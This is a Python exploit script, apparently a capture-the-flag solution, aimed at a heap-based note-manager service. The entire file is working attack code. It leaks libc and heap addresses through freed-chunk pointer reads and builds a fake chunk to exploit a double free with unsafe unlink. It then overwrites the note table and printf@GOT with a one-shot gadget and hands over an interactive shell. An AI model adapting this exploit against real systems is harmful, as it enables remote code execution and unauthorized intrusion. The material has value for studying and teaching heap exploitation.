#!/usr/bin/env python

import socket
import struct
import telnetlib
import time



def p(d):
    return struct.pack("<Q", d)

#s = socket.create_connection(("202.112.26.108", 10001))
s = socket.create_connection(("127.0.0.1", 13337))

def rt(delim):
    buf = ""
    while not delim in buf:
        buf += s.recv(1)
    return buf

def rall():
    buf = ""
    s.setblocking(0)
    begin = time.time()
    while 1:
        if buf is not "" and time.time() - begin  > .5:
            break
        elif time.time() - begin > 1:
            break
        try:
            data = s.recv(4096)
            if data:
                begin = time.time()
                buf += data
            else:
                time.sleep(.1)
        except:
            pass

    return buf

def interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def list_note():
    s.sendall("1\n")
    return rt("choice: ")

def new_note(length, content):
    s.sendall("2\n")
    s.sendall(str(length) + "\n")
    s.sendall(content + "\n")
    rt("choice: ")

def edit_note(num, length, data):
    s.sendall("3\n")
    s.sendall(str(num) + "\n")
    s.sendall(str(length) + "\n")
    s.sendall(data + "\n")


def del_note(num):
    s.sendall("4\n")
    s.sendall(str(num)+"\n")
    rt("choice: ")


def info_leak_libc():
    size = 0x80

    new_note(size, "A"*size)    # note 0
    new_note(size, "B"*size)    # note 1

    del_note(0)

    # allocate a new note of size 1, this will overwrite one byte of the FD
    # pointer, which we know anyway (0xb8)
    new_note(1, "\xb8")


    # We simply list the notes to leak the fd pointer
    list_note()
    rt("0. ")

    # the addr is followed by a new line and preceeded by A's
    leak = rt("1.")[-16:]
    addr = leak.replace("A", "").split("\x0a")[0].ljust(8, '\x00')
    addr = struct.unpack("<Q", addr)[0]

    del_note(1)
    del_note(0)

    rt("choice: ")

    return addr



def info_leak_heap():
    size = 0x10
    new_note(size, "A"*size)    # note 0
    new_note(size, "C"*size)    # note 1
    new_note(size, "D"*size)    # note 2
    new_note(size, "E"*size)    # note 3


    # free two first notes and the fourth. See the writeup for explanation.
    del_note(2)
    del_note(0)

    # same technique as with info_leak_libc()
    new_note(8, "A"*8)
    list_note()
    rt("0. ")

    # extract address
    leak = rt("1.")[-16:]
    addr = leak.replace("A", "").split("\x0a")[0].ljust(8, '\x00')
    addr = struct.unpack("<Q", addr)[0]

    # cleanup
    del_note(0)
    del_note(1)
    del_note(3)

    rt("choice: ")

    return addr




def overwrite_notetable(leaked_addr):
    size = 0x100
    new_note(size, "A"*size)    # note 0
    new_note(size, "B"*size)    # note 1
    new_note(size, "C"*size)    # note 2

    del_note(2)
    del_note(1)
    del_note(0)

    # (leaked_addr - 0x1808) points directly to the note table
    fd = leaked_addr - 0x1808
    bk = fd + 0x8

    # setting up a note that spans all 3 freed chunks. 
    # we create a fake chunk right at the beginning
    # then we manipulate the prev_size field of chunk 2 in such a way that it points to 
    # our fake chunk, which has pointers to the note_table.
    new_note(size*3, 
            p(0x0) + p(0x1) + p(fd) + p(bk) + "A"*(size - 0x20) + 
            p(0x100) + p(0x110) + "A"*size + 
            p(0) + p(0x111)+ "A"*(size-0x20))       

    # freeing the second chunk will overwrite the pointer in the notetable with a pointer into the note 
    # table itself.
    del_note(1)

    raw_input("Continue?")

    rt("choice: ")


def go():

    # address of printf@GOT
    printf_got = 0x602030

    libc_addr = info_leak_libc()
    print ("[+] libc @ " + hex(libc_addr))

    heap_addr = info_leak_heap()
    print ("[+] heap @ " + hex(heap_addr))

    one_shot_shell = libc_addr - 0x37f94e
    print ("[+] One shot shell @ {}".format(hex(one_shot_shell)))
    print ("[+] Exploiting double free")
    overwrite_notetable(heap_addr)

    print("[+] Overwriting note table")
    edit_note(0, 0x300, p(0x100) + p(1) + p(0x8) + p(printf_got) + "A"*1024)

    print("[+] Overwriting printf@GOT")
    edit_note(0, 8, p(one_shot_shell))

    rall()
    print("[+] Shell ready:")


    interact()


go()
